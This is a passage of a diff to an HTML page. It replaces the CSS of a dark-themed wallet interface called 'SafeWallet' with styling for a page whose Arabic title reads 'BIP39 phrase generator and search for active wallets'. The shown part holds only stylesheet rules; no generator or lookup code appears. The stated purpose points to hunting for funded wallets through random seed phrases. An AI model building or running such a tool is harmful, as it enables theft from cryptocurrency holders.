@@ -3,2371 +3,893 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>SafeWallet - محفظة آمنة</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>مولد عبارات BIP39 والبحث عن المحافظ النشطة</title>
     <style>
-        /* إعادة تعيين الأنماط الأساسية */
+        /* تصميم واجهة المستخدم المتجاوبة */
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
         }
 
-        /* المتغيرات العامة */
-        :root {
-            /* الألوان الأساسية - مستوحاة من SafePal */
-            --primary-color: #1652f0;
-            --primary-dark: #0d47d9;
-            --secondary-color: #00d4aa;
-            --accent-color: #ff6b35;
-            --success-color: #00c896;
-            --warning-color: #ffb020;
-            --error-color: #ff4757;
-            
-            /* ألوان الخلفية */
-            --bg-primary: #0f0f23;
-            --bg-secondary: #1a1a3a;
-            --bg-tertiary: #252547;
-            --bg-card: #1e1e3f;
-            --bg-modal: #2a2a4a;
-            
-            /* ألوان النص */
-            --text-primary: #ffffff;
-            --text-secondary: #b8bcc8;
-            --text-muted: #8b8ca7;
-            --text-inverse: #0f0f23;
-            
-            /* ألوان الحدود */
-            --border-color: #3a3a5c;
-            --border-light: #4a4a6c;
-            
-            /* الظلال */
-            --shadow-sm: 0 2px 4px rgba(0, 0, 0, 0.1);
-            --shadow-md: 0 4px 12px rgba(0, 0, 0, 0.15);
-            --shadow-lg: 0 8px 24px rgba(0, 0, 0, 0.2);
-            --shadow-xl: 0 16px 48px rgba(0, 0, 0, 0.3);
-            
-            /* المسافات */
-            --spacing-xs: 4px;
-            --spacing-sm: 8px;
-            --spacing-md: 16px;
-            --spacing-lg: 24px;
-            --spacing-xl: 32px;
-            --spacing-2xl: 48px;
-            
-            /* أحجام الخط */
-            --font-xs: 12px;
-            --font-sm: 14px;
-            --font-md: 16px;
-            --font-lg: 18px;
-            --font-xl: 20px;
-            --font-2xl: 24px;
-            --font-3xl: 32px;
-            
-            /* الانتقالات */
-            --transition-fast: 0.15s ease;
-            --transition-normal: 0.3s ease;
-            --transition-slow: 0.5s ease;
-        }
-
-        /* الخطوط */
         body {
-            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, var(--bg-primary) 0%, var(--bg-secondary) 100%);
-            color: var(--text-primary);
-            line-height: 1.6;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             min-height: 100vh;
+            padding: 20px;
             direction: rtl;
-            overflow-x: hidden;
+            text-align: right;
         }
 
-        /* الحاوي الرئيسي */
-        .app-container {
-            min-height: 100vh;
-            position: relative;
-        }
-
-        /* الشاشات */
-        .screen {
-            display: none;
-            min-height: 100vh;
-            padding: var(--spacing-lg);
-            animation: fadeIn 0.4s ease;
-        }
-
-        .screen.active {
-            display: block;
-        }
-
-        @keyframes fadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(20px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
-        }
-
-        /* شاشة الترحيب */
-        .welcome-container {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            text-align: center;
-            max-width: 400px;
+        .container {
+            max-width: 800px;
             margin: 0 auto;
-        }
-
-        .logo-section {
-            margin-bottom: var(--spacing-2xl);
-        }
-
-        .logo {
-            width: 80px;
-            height: 80px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
+            background: rgba(255, 255, 255, 0.95);
             border-radius: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin: 0 auto var(--spacing-lg);
-            box-shadow: var(--shadow-lg);
-            position: relative;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.1);
             overflow: hidden;
+            backdrop-filter: blur(10px);
         }
 
-        .logo::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            left: -50%;
-            width: 200%;
-            height: 200%;
-            background: linear-gradient(45deg, transparent, rgba(255, 255, 255, 0.1), transparent);
-            transform: rotate(45deg);
-            animation: shimmer 3s infinite;
-        }
-
-        @keyframes shimmer {
-            0% { transform: translateX(-100%) translateY(-100%) rotate(45deg); }
-            100% { transform: translateX(100%) translateY(100%) rotate(45deg); }
-        }
-
-        .logo i {
-            font-size: 36px;
+        .header {
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
             color: white;
-            z-index: 1;
+            padding: 30px;
+            text-align: center;
         }
 
-        .welcome-container h1 {
-            font-size: var(--font-3xl);
+        .header h1 {
+            font-size: 2.5rem;
+            margin-bottom: 10px;
             font-weight: 700;
-            margin-bottom: var(--spacing-sm);
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            background-clip: text;
         }
 
-        .tagline {
-            color: var(--text-secondary);
-            font-size: var(--font-lg);
-            margin-bottom: var(--spacing-2xl);
+        .header p {
+            font-size: 1.1rem;
+            opacity: 0.9;
         }
 
-        .welcome-actions {
+        .main-content {
+            padding: 40px;
+        }
+
+        .control-panel {
+            background: #f8f9fa;
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 30px;
+            border: 1px solid #e9ecef;
+        }
+
+        .control-group {
+            margin-bottom: 25px;
+        }
+
+        .control-group label {
+            display: block;
+            font-weight: 600;
+            margin-bottom: 8px;
+            color: #495057;
+            font-size: 1rem;
+        }
+
+        .control-group input,
+        .control-group select {
             width: 100%;
+            padding: 12px 15px;
+            border: 2px solid #dee2e6;
+            border-radius: 10px;
+            font-size: 1rem;
+            transition: all 0.3s ease;
+            background: white;
+        }
+
+        .control-group input:focus,
+        .control-group select:focus {
+            outline: none;
+            border-color: #4facfe;
+            box-shadow: 0 0 0 3px rgba(79, 172, 254, 0.1);
+        }
+
+        .button-group {
             display: flex;
-            flex-direction: column;
-            gap: var(--spacing-md);
-            margin-bottom: var(--spacing-xl);
+            gap: 15px;
+            flex-wrap: wrap;
+            justify-content: center;
+            margin-top: 30px;
         }
 
-        .security-note {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            color: var(--text-muted);
-            font-size: var(--font-sm);
-        }
-
-        .security-note i {
-            color: var(--success-color);
-        }
-
-        /* الأزرار */
         .btn {
-            padding: var(--spacing-md) var(--spacing-lg);
+            padding: 15px 30px;
             border: none;
-            border-radius: 12px;
-            font-size: var(--font-md);
+            border-radius: 10px;
+            font-size: 1rem;
             font-weight: 600;
             cursor: pointer;
-            transition: all var(--transition-normal);
-            display: flex;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            display: inline-flex;
             align-items: center;
             justify-content: center;
-            gap: var(--spacing-sm);
-            text-decoration: none;
-            position: relative;
-            overflow: hidden;
-            min-height: 48px;
+            gap: 8px;
+            min-width: 150px;
         }
 
         .btn-primary {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
+            background: linear-gradient(135deg, #4facfe 0%, #00f2fe 100%);
             color: white;
-            box-shadow: var(--shadow-md);
         }
 
         .btn-primary:hover {
             transform: translateY(-2px);
-            box-shadow: var(--shadow-lg);
+            box-shadow: 0 10px 20px rgba(79, 172, 254, 0.3);
         }
 
-        .btn-primary:active {
-            transform: translateY(0);
+        .btn-success {
+            background: linear-gradient(135deg, #56ab2f 0%, #a8e6cf 100%);
+            color: white;
+        }
+
+        .btn-success:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(86, 171, 47, 0.3);
+        }
+
+        .btn-danger {
+            background: linear-gradient(135deg, #ff416c 0%, #ff4b2b 100%);
+            color: white;
+        }
+
+        .btn-danger:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(255, 65, 108, 0.3);
         }
 
         .btn-secondary {
-            background: var(--bg-card);
-            color: var(--text-primary);
-            border: 2px solid var(--border-color);
-            box-shadow: var(--shadow-sm);
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
         }
 
         .btn-secondary:hover {
-            border-color: var(--primary-color);
-            background: var(--bg-tertiary);
-            transform: translateY(-1px);
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
         }
 
-        .btn-full {
-            width: 100%;
+        .btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none !important;
+            box-shadow: none !important;
         }
 
-        /* رؤوس الشاشات */
-        .screen-header {
-            display: flex;
-            align-items: center;
-            margin-bottom: var(--spacing-xl);
-            gap: var(--spacing-md);
-        }
-
-        .back-btn {
-            width: 40px;
-            height: 40px;
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            cursor: pointer;
-            transition: all var(--transition-fast);
-        }
-
-        .back-btn:hover {
-            background: var(--bg-tertiary);
-            border-color: var(--primary-color);
-        }
-
-        .screen-header h2 {
-            font-size: var(--font-2xl);
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        /* شاشة كلمة المرور */
-        .password-container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
-
-        .password-form {
-            background: var(--bg-card);
-            border-radius: 16px;
-            padding: var(--spacing-xl);
-            margin-bottom: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        .form-section {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .form-section label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: var(--spacing-sm);
-            color: var(--text-primary);
-        }
-
-        .password-input-container {
-            position: relative;
-        }
-
-        .password-input {
-            width: 100%;
-            padding: var(--spacing-md);
-            padding-left: 50px;
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: var(--font-md);
-            transition: border-color var(--transition-fast);
-        }
-
-        .password-input:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .password-toggle {
-            position: absolute;
-            left: 15px;
-            top: 50%;
-            transform: translateY(-50%);
-            background: none;
-            border: none;
-            color: var(--text-secondary);
-            cursor: pointer;
-            font-size: var(--font-md);
-        }
-
-        .password-toggle:hover {
-            color: var(--primary-color);
-        }
-
-        .password-strength {
-            margin-top: var(--spacing-sm);
-            height: 4px;
-            background: var(--bg-tertiary);
-            border-radius: 2px;
-            overflow: hidden;
-        }
-
-        .password-strength-bar {
-            height: 100%;
-            width: 0%;
-            transition: all var(--transition-normal);
-            border-radius: 2px;
-        }
-
-        .password-strength-bar.weak {
-            width: 25%;
-            background: var(--error-color);
-        }
-
-        .password-strength-bar.fair {
-            width: 50%;
-            background: var(--warning-color);
-        }
-
-        .password-strength-bar.good {
-            width: 75%;
-            background: var(--secondary-color);
-        }
-
-        .password-strength-bar.strong {
-            width: 100%;
-            background: var(--success-color);
-        }
-
-        .password-requirements {
-            margin-top: var(--spacing-sm);
-            font-size: var(--font-sm);
-            color: var(--text-muted);
-        }
-
-        .password-requirements ul {
-            list-style: none;
-            margin-top: var(--spacing-xs);
-        }
-
-        .password-requirements li {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-xs);
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .password-requirements li.valid {
-            color: var(--success-color);
-        }
-
-        .password-requirements li.invalid {
-            color: var(--error-color);
-        }
-
-        /* شاشة الاستيراد */
-        .import-container {
-            max-width: 500px;
-            margin: 0 auto;
-        }
-
-        .import-form {
-            background: var(--bg-card);
-            border-radius: 16px;
-            padding: var(--spacing-xl);
-            margin-bottom: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        #mnemonicInput {
-            width: 100%;
-            padding: var(--spacing-md);
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: var(--font-md);
-            resize: vertical;
-            min-height: 120px;
-            transition: border-color var(--transition-fast);
-        }
-
-        #mnemonicInput:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .input-hint {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-xs);
-            margin-top: var(--spacing-sm);
-            color: var(--text-muted);
-            font-size: var(--font-sm);
-        }
-
-        .security-warning {
-            background: rgba(255, 107, 53, 0.1);
-            border: 1px solid var(--accent-color);
-            border-radius: 12px;
-            padding: var(--spacing-md);
-            display: flex;
-            gap: var(--spacing-md);
-            align-items: flex-start;
-        }
-
-        .security-warning i {
-            color: var(--accent-color);
-            margin-top: 2px;
-        }
-
-        .security-warning strong {
-            color: var(--accent-color);
-        }
-
-        /* شاشة إنشاء المحفظة */
-        .create-container {
-            max-width: 600px;
-            margin: 0 auto;
-        }
-
-        .wallet-info-card {
-            background: var(--bg-card);
-            border-radius: 16px;
-            padding: var(--spacing-xl);
-            margin-bottom: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        .info-section {
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .info-section:last-child {
-            margin-bottom: 0;
-        }
-
-        .info-section label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: var(--spacing-sm);
-            color: var(--text-secondary);
-            font-size: var(--font-sm);
-            text-transform: uppercase;
-            letter-spacing: 0.5px;
-        }
-
-        .address-display {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            background: var(--bg-tertiary);
-            padding: var(--spacing-md);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-        }
-
-        .address-display span {
-            flex: 1;
-            font-family: 'Courier New', monospace;
-            font-size: var(--font-sm);
-            word-break: break-all;
-            color: var(--text-primary);
-        }
-
-        .mnemonic-display {
-            background: var(--bg-tertiary);
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            position: relative;
-        }
-
-        .mnemonic-words {
-            padding: var(--spacing-md);
-            font-family: 'Courier New', monospace;
-            font-size: var(--font-sm);
-            line-height: 1.8;
-            color: var(--text-primary);
-            min-height: 80px;
-            display: flex;
-            align-items: center;
-        }
-
-        .copy-btn {
-            background: var(--primary-color);
-            color: white;
-            border: none;
-            border-radius: 6px;
-            padding: var(--spacing-sm);
-            cursor: pointer;
-            transition: background-color var(--transition-fast);
-            min-width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .copy-btn:hover {
-            background: var(--primary-dark);
-        }
-
-        .backup-warning {
-            background: rgba(0, 200, 150, 0.1);
-            border: 1px solid var(--success-color);
-            border-radius: 12px;
-            padding: var(--spacing-md);
-            display: flex;
-            gap: var(--spacing-md);
-            align-items: flex-start;
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .backup-warning i {
-            color: var(--success-color);
-            margin-top: 2px;
-        }
-
-        .backup-warning strong {
-            color: var(--success-color);
-        }
-
-        /* شاشة المحفظة الرئيسية */
-        .wallet-container {
-            max-width: 800px;
-            margin: 0 auto;
-        }
-
-        .wallet-header {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .wallet-info {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            background: var(--bg-card);
-            border-radius: 16px;
-            padding: var(--spacing-lg);
-            box-shadow: var(--shadow-md);
-        }
-
-        .wallet-name h3 {
-            font-size: var(--font-xl);
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .wallet-address-short {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-        }
-
-        .wallet-address-short span {
-            font-family: 'Courier New', monospace;
-            color: var(--text-secondary);
-            font-size: var(--font-sm);
-        }
-
-        .copy-btn-small {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            border-radius: 4px;
-            color: var(--text-secondary);
-            padding: var(--spacing-xs);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 24px;
-            height: 24px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .copy-btn-small:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        .settings-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-secondary);
-            padding: var(--spacing-sm);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 40px;
-            height: 40px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .settings-btn:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-            background: rgba(22, 82, 240, 0.1);
-        }
-
-        /* قسم الرصيد */
-        .balance-section {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .balance-card {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            border-radius: 20px;
-            padding: var(--spacing-xl);
-            text-align: center;
-            position: relative;
-            overflow: hidden;
-            box-shadow: var(--shadow-lg);
-        }
-
-        .balance-card::before {
-            content: '';
-            position: absolute;
-            top: -50%;
-            right: -50%;
-            width: 200%;
-            height: 200%;
-            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
-            animation: pulse 4s ease-in-out infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { transform: scale(1); opacity: 0.5; }
-            50% { transform: scale(1.1); opacity: 0.8; }
-        }
-
-        .balance-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: var(--spacing-md);
-            position: relative;
-            z-index: 1;
-        }
-
-        .balance-header span {
-            color: rgba(255, 255, 255, 0.9);
-            font-size: var(--font-sm);
-            font-weight: 500;
-        }
-
-        .refresh-btn {
-            background: rgba(255, 255, 255, 0.2);
-            border: none;
-            border-radius: 6px;
-            color: white;
-            padding: var(--spacing-xs);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .refresh-btn:hover {
-            background: rgba(255, 255, 255, 0.3);
-            transform: rotate(180deg);
-        }
-
-        .balance-amount {
-            font-size: var(--font-3xl);
-            font-weight: 700;
-            color: white;
-            margin-bottom: var(--spacing-sm);
-            position: relative;
-            z-index: 1;
-        }
-
-        .currency {
-            font-size: var(--font-lg);
-            opacity: 0.9;
-        }
-
-        .balance-usd {
-            color: rgba(255, 255, 255, 0.8);
-            font-size: var(--font-md);
-            position: relative;
-            z-index: 1;
-        }
-
-        /* الإجراءات السريعة */
-        .quick-actions {
-            display: grid;
-            grid-template-columns: repeat(6, 1fr);
-            gap: var(--spacing-md);
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .action-btn {
-            background: var(--bg-card);
-            border: 1px solid var(--border-color);
-            border-radius: 16px;
-            padding: var(--spacing-lg);
-            cursor: pointer;
-            transition: all var(--transition-normal);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: var(--spacing-sm);
-            text-align: center;
-            color: var(--text-primary);
-            box-shadow: var(--shadow-sm);
-        }
-
-        .action-btn:hover {
-            transform: translateY(-4px);
-            box-shadow: var(--shadow-md);
-            border-color: var(--primary-color);
-        }
-
-        .action-icon {
-            width: 48px;
-            height: 48px;
-            border-radius: 12px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            font-size: 20px;
-            margin-bottom: var(--spacing-xs);
-        }
-
-        .action-icon.send {
-            background: linear-gradient(135deg, var(--accent-color), #ff8c42);
-            color: white;
-        }
-
-        .action-icon.receive {
-            background: linear-gradient(135deg, var(--success-color), #00e6b8);
-            color: white;
-        }
-
-        .action-icon.swap {
-            background: linear-gradient(135deg, var(--secondary-color), #00f0cc);
-            color: white;
-        }
-
-        .action-icon.buy {
-            background: linear-gradient(135deg, var(--primary-color), var(--primary-dark));
-            color: white;
-        }
-
-        .action-icon.support {
-            background: linear-gradient(135deg, var(--warning-color), #ffcc00);
-            color: white;
-        }
-
-        .action-icon.transactions {
-            background: linear-gradient(135deg, #9c27b0, #e91e63);
-            color: white;
-        }
-
-        .action-btn span {
-            font-size: var(--font-sm);
-            font-weight: 500;
-        }
-
-        /* الأقسام */
-        .assets-section,
-        .transactions-section {
-            margin-bottom: var(--spacing-xl);
-        }
-
-        .section-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-bottom: var(--spacing-md);
-        }
-
-        .section-header h4 {
-            font-size: var(--font-lg);
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        .add-btn,
-        .view-all-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: var(--text-secondary);
-            padding: var(--spacing-xs) var(--spacing-sm);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            font-size: var(--font-sm);
-        }
-
-        .add-btn:hover,
-        .view-all-btn:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        /* قائمة الأصول */
-        .assets-list {
-            background: var(--bg-card);
-            border-radius: 12px;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .loading-assets {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            gap: var(--spacing-md);
-            padding: var(--spacing-xl);
-            color: var(--text-secondary);
-        }
-
-        .asset-item {
-            display: flex;
-            align-items: center;
-            padding: var(--spacing-md);
-            border-bottom: 1px solid var(--border-color);
-            transition: background-color var(--transition-fast);
-        }
-
-        .asset-item:hover {
-            background: var(--bg-tertiary);
-        }
-
-        .asset-item:last-child {
-            border-bottom: none;
-        }
-
-        .asset-icon {
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(135deg, var(--primary-color), var(--secondary-color));
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-left: var(--spacing-md);
-            color: white;
-            font-weight: 600;
-            font-size: var(--font-sm);
-        }
-
-        .asset-details {
-            flex: 1;
-        }
-
-        .asset-details h5 {
-            font-size: var(--font-md);
-            margin-bottom: 2px;
-            color: var(--text-primary);
-        }
-
-        .asset-details p {
-            font-size: var(--font-sm);
-            color: var(--text-secondary);
-        }
-
-        .asset-balance {
-            text-align: left;
-            font-weight: 600;
-            color: var(--text-primary);
-        }
-
-        /* قائمة المعاملات */
-        .transactions-list {
-            background: var(--bg-card);
-            border-radius: 12px;
-            box-shadow: var(--shadow-sm);
-        }
-
-        .no-transactions {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: var(--spacing-sm);
-            padding: var(--spacing-xl);
-            color: var(--text-muted);
-        }
-
-        .no-transactions i {
-            font-size: var(--font-2xl);
-            opacity: 0.5;
-        }
-
-        .transaction-item {
-            display: flex;
-            align-items: center;
-            padding: var(--spacing-md);
-            border-bottom: 1px solid var(--border-color);
-            transition: background-color var(--transition-fast);
-            cursor: pointer;
-        }
-
-        .transaction-item:hover {
-            background: var(--bg-tertiary);
-        }
-
-        .transaction-item:last-child {
-            border-bottom: none;
-        }
-
-        .transaction-icon {
-            width: 40px;
-            height: 40px;
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-left: var(--spacing-md);
-            color: white;
-            font-size: 16px;
-        }
-
-        .transaction-icon.send {
-            background: var(--accent-color);
-        }
-
-        .transaction-icon.receive {
-            background: var(--success-color);
-        }
-
-        .transaction-details {
-            flex: 1;
-        }
-
-        .transaction-details h5 {
-            font-size: var(--font-md);
-            margin-bottom: 2px;
-            color: var(--text-primary);
-        }
-
-        .transaction-details p {
-            font-size: var(--font-sm);
-            color: var(--text-secondary);
-        }
-
-        .transaction-amount {
-            text-align: left;
-            font-weight: 600;
-        }
-
-        .transaction-amount.positive {
-            color: var(--success-color);
-        }
-
-        .transaction-amount.negative {
-            color: var(--accent-color);
-        }
-
-        /* النوافذ المنبثقة */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: rgba(0, 0, 0, 0.8);
-            z-index: 1000;
-            backdrop-filter: blur(4px);
-        }
-
-        .modal.active {
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            animation: modalFadeIn 0.3s ease;
-        }
-
-        @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-            }
-            to {
-                opacity: 1;
-            }
-        }
-
-        .modal-content {
-            background: var(--bg-modal);
-            border-radius: 16px;
-            max-width: 500px;
-            width: 90%;
-            max-height: 90vh;
-            overflow-y: auto;
-            box-shadow: var(--shadow-xl);
-            animation: modalSlideIn 0.3s ease;
-        }
-
-        @keyframes modalSlideIn {
-            from {
-                transform: translateY(-50px);
-                opacity: 0;
-            }
-            to {
-                transform: translateY(0);
-                opacity: 1;
-            }
-        }
-
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            padding: var(--spacing-lg);
-            border-bottom: 1px solid var(--border-color);
-        }
-
-        .modal-header h3 {
-            font-size: var(--font-xl);
-            color: var(--text-primary);
-        }
-
-        .close-btn {
-            background: transparent;
-            border: none;
-            border-radius: 6px;
-            color: var(--text-secondary);
-            font-size: var(--font-lg);
-            cursor: pointer;
-            padding: var(--spacing-xs);
-            transition: color var(--transition-fast);
-            width: 32px;
-            height: 32px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .close-btn:hover {
-            color: var(--text-primary);
-        }
-
-        .modal-body {
-            padding: var(--spacing-lg);
-        }
-
-        /* نماذج الإدخال */
-        .form-group {
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .form-group label {
-            display: block;
-            font-weight: 600;
-            margin-bottom: var(--spacing-sm);
-            color: var(--text-primary);
-        }
-
-        .form-group input,
-        .form-group select,
-        .form-group textarea {
-            width: 100%;
-            padding: var(--spacing-md);
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-primary);
-            font-size: var(--font-md);
-            transition: border-color var(--transition-fast);
-        }
-
-        .form-group input:focus,
-        .form-group select:focus,
-        .form-group textarea:focus {
-            outline: none;
-            border-color: var(--primary-color);
-            box-shadow: 0 0 0 3px rgba(22, 82, 240, 0.1);
-        }
-
-        .form-group textarea {
-            resize: vertical;
-            min-height: 100px;
-        }
-
-        .input-with-scan {
-            display: flex;
-            gap: var(--spacing-sm);
-        }
-
-        .input-with-scan input {
-            flex: 1;
-        }
-
-        .scan-btn {
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            color: var(--text-secondary);
-            padding: var(--spacing-md);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 48px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .scan-btn:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        .amount-input {
-            display: flex;
-            gap: var(--spacing-sm);
-        }
-
-        .amount-input input {
-            flex: 1;
-        }
-
-        .amount-input select {
-            width: 120px;
-        }
-
-        /* خيارات الغاز */
-        .gas-options {
-            display: grid;
-            grid-template-columns: repeat(3, 1fr);
-            gap: var(--spacing-sm);
-        }
-
-        .gas-option {
-            background: var(--bg-tertiary);
-            border: 2px solid var(--border-color);
-            border-radius: 8px;
-            padding: var(--spacing-md);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            gap: var(--spacing-xs);
-            color: var(--text-primary);
-        }
-
-        .gas-option:hover {
-            border-color: var(--primary-color);
-        }
-
-        .gas-option.active {
-            border-color: var(--primary-color);
-            background: rgba(22, 82, 240, 0.1);
-        }
-
-        .gas-price {
-            font-size: var(--font-xs);
-            color: var(--text-secondary);
-        }
-
-        /* نافذة الاستقبال */
-        .receive-content {
-            text-align: center;
-        }
-
-        .qr-section {
-            margin-bottom: var(--spacing-lg);
-        }
-
-        .qr-code {
-            width: 200px;
-            height: 200px;
+        .status-panel {
             background: white;
-            border-radius: 12px;
-            margin: 0 auto var(--spacing-md);
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            box-shadow: var(--shadow-md);
+            border-radius: 15px;
+            padding: 25px;
+            margin-bottom: 25px;
+            border: 1px solid #e9ecef;
         }
 
-        .address-section {
-            margin-bottom: var(--spacing-lg);
+        .status-panel h3 {
+            color: #495057;
+            margin-bottom: 20px;
+            font-size: 1.3rem;
         }
 
-        .receive-warning {
-            background: rgba(255, 182, 32, 0.1);
-            border: 1px solid var(--warning-color);
-            border-radius: 8px;
-            padding: var(--spacing-md);
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-sm);
-            font-size: var(--font-sm);
-            color: var(--warning-color);
+        .status-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 20px;
+            margin-bottom: 20px;
         }
 
-        /* نافذة الإعدادات */
-        .settings-list {
-            display: flex;
-            flex-direction: column;
-            gap: 1px;
-            background: var(--border-color);
-            border-radius: 8px;
-            overflow: hidden;
-        }
-
-        .setting-item {
-            background: var(--bg-tertiary);
-            padding: var(--spacing-md);
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .setting-item.danger {
-            background: rgba(255, 71, 87, 0.1);
-        }
-
-        .setting-info {
-            display: flex;
-            align-items: center;
-            gap: var(--spacing-md);
-            color: var(--text-primary);
-        }
-
-        .setting-item.danger .setting-info {
-            color: var(--error-color);
-        }
-
-        .setting-btn {
-            background: transparent;
-            border: 1px solid var(--border-color);
-            border-radius: 6px;
-            color: var(--text-secondary);
-            padding: var(--spacing-sm);
-            cursor: pointer;
-            transition: all var(--transition-fast);
-            width: 36px;
-            height: 36px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-        }
-
-        .setting-btn:hover {
-            border-color: var(--primary-color);
-            color: var(--primary-color);
-        }
-
-        .setting-btn.danger {
